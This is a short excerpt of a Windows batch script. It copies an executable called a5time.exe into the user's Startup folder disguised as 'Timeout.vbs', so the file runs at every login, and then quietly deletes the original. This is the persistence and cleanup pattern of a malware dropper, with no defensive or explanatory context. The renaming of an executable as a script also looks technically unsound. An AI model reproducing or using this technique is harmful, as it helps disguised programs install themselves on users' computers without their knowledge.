...
copy a5time.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Timeout.vbs"/y
if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Timeout.vbs" del a5time.exe/q
